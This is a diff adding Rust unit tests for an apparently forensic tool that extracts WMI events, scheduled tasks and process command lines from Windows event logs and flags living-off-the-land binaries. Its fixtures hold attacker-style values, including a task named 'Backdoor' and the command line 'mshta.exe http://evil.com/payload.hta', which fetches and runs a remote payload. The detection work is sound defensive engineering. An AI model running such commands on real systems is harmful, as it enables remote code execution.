@@ -1585,6 +1585,131 @@ fn collect_field_values(v: &serde_json::Value, field_name: &str, out: &mut std::
     }
 }
 
+// ── WMI / Scheduled-task / Cmdline type tests ─────────────────────────────────
+
+#[cfg(test)]
+mod extraction_tests {
+    use super::*;
+
+    #[test]
+    fn wmi_event_fields_are_accessible() {
+        let e = WmiEvent {
+            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
+            event_id: 5861,
+            provider: Some("WMI".to_string()),
+            filter_name: Some("TestFilter".to_string()),
+            consumer_name: Some("TestConsumer".to_string()),
+            query: Some("SELECT * FROM __InstanceModificationEvent".to_string()),
+        };
+        assert_eq!(e.event_id, 5861);
+        assert!(e.filter_name.is_some());
+    }
+
+    #[test]
+    fn wmi_event_serializes_to_json() {
+        let e = WmiEvent {
+            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
+            event_id: 5860,
+            provider: None,
+            filter_name: None,
+            consumer_name: None,
+            query: Some("SELECT * FROM __InstanceCreationEvent".to_string()),
+        };
+        let json = serde_json::to_string(&e).expect("serialize WmiEvent");
+        assert!(json.contains("5860"));
+    }
+
+    #[test]
+    fn wmi_events_nonexistent_path_returns_error() {
+        let result = wmi_events(Path::new("/nonexistent/security.evtx"));
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn scheduled_task_fields_are_accessible() {
+        let t = ScheduledTask {
+            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
+            event_id: 4698,
+            task_name: Some("\\Backdoor".to_string()),
+            task_content: Some("<Task>...</Task>".to_string()),
+            subject_user: Some("SYSTEM".to_string()),
+        };
+        assert_eq!(t.event_id, 4698);
+        assert!(t.task_name.is_some());
+    }
+
+    #[test]
+    fn scheduled_task_serializes_to_json() {
+        let t = ScheduledTask {
+            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
+            event_id: 4702,
+            task_name: Some("\\TestTask".to_string()),
+            task_content: None,
+            subject_user: None,
+        };
+        let json = serde_json::to_string(&t).expect("serialize ScheduledTask");
+        assert!(json.contains("4702"));
+        assert!(json.contains("TestTask"));
+    }
+
+    #[test]
+    fn scheduled_tasks_nonexistent_path_returns_error() {
+        let result = scheduled_tasks(Path::new("/nonexistent/security.evtx"));
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn process_execution_fields_are_accessible() {
+        let p = ProcessExecution {
+            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
+            pid: 1234,
+            parent_pid: 567,
+            image: "C:\\Windows\\System32\\cmd.exe".to_string(),
+            command_line: "cmd.exe /c whoami".to_string(),
+            parent_image: Some("explorer.exe".to_string()),
+            is_lolbin: false,
+        };
+        assert_eq!(p.pid, 1234);
+        assert!(!p.is_lolbin);
+    }
+
+    #[test]
+    fn process_execution_lolbin_detected() {
+        let p = ProcessExecution {
+            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
+            pid: 999,
+            parent_pid: 1,
+            image: "C:\\Windows\\System32\\mshta.exe".to_string(),
+            command_line: "mshta.exe http://evil.com/payload.hta".to_string(),
+            parent_image: None,
+            is_lolbin: true,
+        };
+        assert!(p.is_lolbin);
+    }
+
+    #[test]
+    fn process_execution_serializes_to_json() {
+        let p = ProcessExecution {
+            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
+            pid: 1234,
+            parent_pid: 567,
+            image: "C:\\Windows\\System32\\wscript.exe".to_string(),
+            command_line: "wscript.exe payload.vbs".to_string(),
+            parent_image: None,
+            is_lolbin: true,
+        };
+        let json = serde_json::to_string(&p).expect("serialize ProcessExecution");
+        assert!(json.contains("is_lolbin"));
+        assert!(json.contains("wscript.exe"));
+    }
+
+    #[test]
+    fn process_cmdlines_nonexistent_path_returns_error() {
+        let result = process_cmdlines(Path::new("/nonexistent/security.evtx"));
+        assert!(result.is_err());
+    }
+}
+
 // ── ATT&CK tests ─────────────────────────────────────────────────────────────
 
 #[cfg(test)]
